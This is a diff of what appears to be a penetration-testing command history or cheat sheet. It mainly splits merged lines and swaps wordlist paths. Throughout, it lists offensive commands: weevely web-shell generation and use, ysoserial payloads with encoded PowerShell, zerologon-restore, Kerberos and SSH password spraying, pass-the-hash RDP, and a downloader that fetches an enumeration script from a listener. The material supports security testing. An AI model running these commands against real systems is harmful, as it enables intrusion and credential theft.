-sliver-clientsmali assemble code-smali/ -o code-dex/smartbrute -v -np 'exegol4thewin' --set-as-owned smart -bp "somepassword" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$DC_IP" kerberos
+sliver-client
+smali assemble code-smali/ -o code-dex/
+smartbrute -v -np 'exegol4thewin' --set-as-owned smart -bp "somepassword" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$DC_IP" kerberos
 smartbrute brute -bU users.txt -bp "password" kerberos --kdc-ip "$KDC" 
 smartbrute smart -bp "password" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$KDC" kerberos
 smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
@@ -2734,13 +2694,19 @@ ssh admin@<ip> -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-grou
 ssh admin@<ip> -oHostKeyAlgorithms=+ssh-rsa+diffie-hellman-group1-sha1
 ssh-keygen -t rsa -b 4096 -f keyname
 ssh-keyscan -t rsa <IP> -p <PORT>
-sshuttle -r $USER@$TARGET 0.0.0.0/24sslscan $TARGETsslyze --sslv2 --sslv3 --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3 --heartbleed --robot --openssl_ccs --compression --reneg --certinfo --elliptic_curves --early_data --fallback --json_out=sslyze.json $TARGET
+sshuttle -r $USER@$TARGET 0.0.0.0/24
+sslscan $TARGET
+sslyze --sslv2 --sslv3 --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3 --heartbleed --robot --openssl_ccs --compression --reneg --certinfo --elliptic_curves --early_data --fallback --json_out=sslyze.json $TARGET
 ssrfmap.py -r request.txt -p id -m readfiles,portscan
 StandIn.exe --dns --filter SQL --limit 10
 StandIn.exe --dns --forest --domain redhook --user User --pass Passw0rd
 StandIn.exe --dns --legacy --domain redhook --user User --pass Passw0rd
 standIn.exe --dns --limit 20
-steghide extract -sf image.pngstegolsb -v extract image.png --column-step 2 --rows 1 --columns 128stegosuitestrace -p $PIDsubfinder -d "$DOMAIN" 
+steghide extract -sf image.png
+stegolsb -v extract image.png --column-step 2 --rows 1 --columns 128
+stegosuite
+strace -p $PID
+subfinder -d "$DOMAIN" 
 stty raw -echo
 stty rows <ROWS> cols <COLS>
 subfinder -d "$DOMAIN" | shuffledns -d "$DOMAIN" -r resolvers.txt
@@ -2919,7 +2885,8 @@ tree
 trevorspray --recon $DOMAIN -u emails.txt --threads 10
 trevorspray -u emails.txt -p $PASSWORD --ssh root@$TARGETtridtrilium-starttshark -i eth0 -w capture.pcap
 tshark -r capture.pcaptwint -u username --since '2015-12-20 20:30:15'
-twint -g='48.880048,2.385939,1km' -o file.csv --csvuberfile --lhost $TARGET --lport $PORT --target-os linux --downloader python --input-file LinEnum.sh --output-file /tmp/linenum.shupdog --ssl --port 9090 --password "exegol4thewin" --directory /opt/resources
+twint -g='48.880048,2.385939,1km' -o file.csv --csvuberfile --lhost $TARGET --lport $PORT --target-os linux --downloader python --input-file LinEnum.sh --output-file /tmp/linenum.sh
+updog --ssl --port 9090 --password "exegol4thewin" --directory /opt/resources
 type C:\WINDOWS\System32\drivers\etc\hosts
 unblob --show-external-dependencies
 unblob <firmware_file>
@@ -2983,14 +2950,15 @@ webclientservicescanner -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOS
 weevely <url> <password>
 weevely generate $PASSWORD ./webshell-exegol.php
 weevely generate <password> <output_file|web_shell.php>
-weevely https://$TARGET/webshell-exegol.php $PASSWORD idwfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic "FUZZ:FUZ2Z" -u "http://$TARGET/secretpage"
+weevely https://$TARGET/webshell-exegol.php $PASSWORD output
+wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic "FUZZ:FUZ2Z" -u "http://$TARGET/secretpage"
 wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\user /p:0987654321
 wfuzz --hc 403,404 -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u "http://$TARGET/FUZZFUZ2Z"
-wfuzz --hc 404,403 -H "User-Agent: PENTEST" -c -z file,"/path/to/wordlist.txt" $URL/FUZZ
+wfuzz --hc 404,403 -H "User-Agent: PENTEST" -c -z file,`fzf-wordlists` $URL/FUZZ
 wfuzz --hh 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
 wfuzz --hh 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u "http://$TARGET/"
 wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=FUZZ&password=FUZ2Z' -u "http://$TARGET/admin"
-wfuzz -H "Host: FUZZ.something.com" --hc 404,403 -H "User-Agent: PENTEST" -c -z file,"/path/to/wordlist.txt" $URL
+wfuzz -H "Host: FUZZ.something.com" --hc 404,403 -H "User-Agent: PENTEST" -c -z file,`fzf-wordlists` $URL
 wfuzz -z file,<file> -u <url>FUZZ
 wfuzz -z file,<file> -X post -u <url> -d 'FUZZ=1'
 wfuzz -z range,1-1000 -u <url>FUZZ
@@ -3016,7 +2984,9 @@ whoami /priv
 whoami /priv #Show only privileges
 Wifite.py --dict passwords.txt
 windapsearch --dc "$DC_HOST" --module metadata
-windapsearch --dc "$DC_HOST" --module userswiresharkwpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --enumerate u1-20
+windapsearch --dc "$DC_HOST" --module users
+wireshark
+wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --enumerate u1-20
 wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers
 wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
 wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
@@ -3057,9 +3027,9 @@ wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-detect
 wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
 wpscan --url $URL
 wpscan --url $URL --enumerate u
-wpscan --url $URL --enumerate u --passwords "/path/to/wordlist.txt"
+wpscan --url $URL --enumerate u --passwords `fzf-wordlists`
 wpscan --url $URL --enumerate u1-100
-wpscan --url $URL --username $username --passwords "/path/to/wordlist.txt"
+wpscan --url $URL --username $username --passwords `fzf-wordlists`
 wuzz $TARGETxfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore
 xclip -o
 xclip -o 
@@ -3124,7 +3094,10 @@ xspy <ip>
 xwd –root –screen –silent –display <ip>:<display> > screenshot.xwd; convert screenshot.xwd screenshot.png
 xwininfo -root -tree -display <ip>:<display>
 yalis -u admin@example.com -p Password123 --id 1234 -f csv -o yalis-1234.csv
-yalis -u admin@example.com -p Password123 --name "Company Name Inc." -f csv -o yalis-company-name.csvyoutube-dl $TARGETysoserial CommonsCollections1 calc.exe > groovypayload.binzerologon-restore.py "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
+yalis -u admin@example.com -p Password123 --name "Company Name Inc." -f csv -o yalis-company-name.csv
+youtube-dl $TARGET
+ysoserial CommonsCollections1 calc.exe > groovypayload.bin
+zerologon-restore.py "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
 ysoserial.exe -f <lib|Json.Net> -g <gadget|ObjectDataProvider> -o raw -c "<command|calc.exe>" -t
 ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell -EncodedCommand <base64_encoded_command>" --path="<asp_file_webroot_relative_path>" --apppath="<application_path_webroot_relative>" --decryptionalg="3DES" --decryptionkey="<decryption_key>" --validationalg="SHA1" --validationkey="<validation_state>"
 yum autoremove
